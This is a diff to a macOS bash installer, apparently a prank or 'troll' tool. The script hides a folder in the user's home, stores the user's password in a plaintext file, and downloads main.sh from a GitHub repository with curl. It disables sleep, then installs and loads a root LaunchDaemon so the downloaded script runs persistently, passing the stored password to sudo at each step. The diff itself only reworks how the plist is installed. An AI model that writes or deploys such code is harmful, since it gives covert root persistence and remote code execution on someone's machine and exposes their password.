@@ -14,6 +14,9 @@ MAIN_SCRIPT="$TARGET_DIR/main.sh"
 PLIST_LABEL="com.programfiles.main"
 PLIST_PATH="/Library/LaunchDaemons/$PLIST_LABEL.plist"
 
+# Temp plist path for safe installation
+TMP_PLIST="/tmp/$PLIST_LABEL.plist"
+
 echo "[$(date)] Script started as $CURRENT_USER."
 
 # Always ensure the folder is hidden if it exists
@@ -30,11 +33,13 @@ if [ -d "$TARGET_DIR" ]; then
     PASSWORD=$(<"$PFILE")
 
     echo "✅ $TARGET_DIR exists (hidden)."
-    echo "→ Writing LaunchDaemon plist to $PLIST_PATH..."
-    cat <<EOF | echo "$PASSWORD" | sudo -S tee "$PLIST_PATH" >/dev/null
+
+    # Create plist in /tmp
+    echo "→ Writing LaunchDaemon plist to $TMP_PLIST as current user..."
+    cat <<EOF > "$TMP_PLIST"
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \
-  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+    "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
   <dict>
     <key>Label</key>
@@ -49,15 +54,23 @@ if [ -d "$TARGET_DIR" ]; then
 </plist>
 EOF
 
+    # Move into place and set correct ownership and permissions
+    echo "→ Installing plist to $PLIST_PATH..."
+    echo "$PASSWORD" | sudo -S mv "$TMP_PLIST" "$PLIST_PATH"
+    echo "$PASSWORD" | sudo -S chown root:wheel "$PLIST_PATH"
+    echo "$PASSWORD" | sudo -S chmod 644 "$PLIST_PATH"
+
+    # Load the LaunchDaemon
     echo "→ Loading LaunchDaemon..."
     echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"
 
-    echo "→ Launching $MAIN_SCRIPT now…"
+    # Launch main script immediately
+    echo "→ Launching $MAIN_SCRIPT now..."
     "$MAIN_SCRIPT"
 
 else
     # -> First-time bootstrap: create & hide folder, store password
-    echo "❌ $TARGET_DIR not found. Bootstrapping…"
+    echo "❌ $TARGET_DIR not found. Bootstrapping..."
     echo "→ Creating folder $TARGET_DIR"
     mkdir -p "$TARGET_DIR"
 
@@ -73,7 +86,7 @@ else
     echo "→ Recording current time in time.txt"
     date +'%Y:%m:%d:%H:%M:%S' >"$TARGET_DIR/time.txt"
 
-    echo "→ Downloading main.sh from github"
+    echo "→ Downloading main.sh from GitHub"
     curl -fsSL "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/main.sh" -o "$MAIN_SCRIPT"
 
     echo "→ Disabling all macOS sleep (even on lid close)"
@@ -82,11 +95,12 @@ else
     echo "→ Making main.sh executable"
     chmod +x "$MAIN_SCRIPT"
 
-    echo "→ Writing LaunchDaemon plist to $PLIST_PATH..."
-    cat <<EOF | echo "$PASSWORD" | sudo -S tee "$PLIST_PATH" >/dev/null
+    # Create plist in /tmp
+    echo "→ Writing LaunchDaemon plist to $TMP_PLIST as current user..."
+    cat <<EOF > "$TMP_PLIST"
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" \
-  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+    "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
   <dict>
     <key>Label</key>
@@ -101,10 +115,18 @@ else
 </plist>
 EOF
 
+    # Move into place and set correct ownership and permissions
+    echo "→ Installing plist to $PLIST_PATH..."
+    echo "$PASSWORD" | sudo -S mv "$TMP_PLIST" "$PLIST_PATH"
+    echo "$PASSWORD" | sudo -S chown root:wheel "$PLIST_PATH"
+    echo "$PASSWORD" | sudo -S chmod 644 "$PLIST_PATH"
+
+    # Load the LaunchDaemon
     echo "→ Loading LaunchDaemon..."
     echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"
 
-    echo "→ Launching $MAIN_SCRIPT now…"
+    # Launch main script immediately
+    echo "→ Launching $MAIN_SCRIPT now..."
     "$MAIN_SCRIPT"
 fi
 
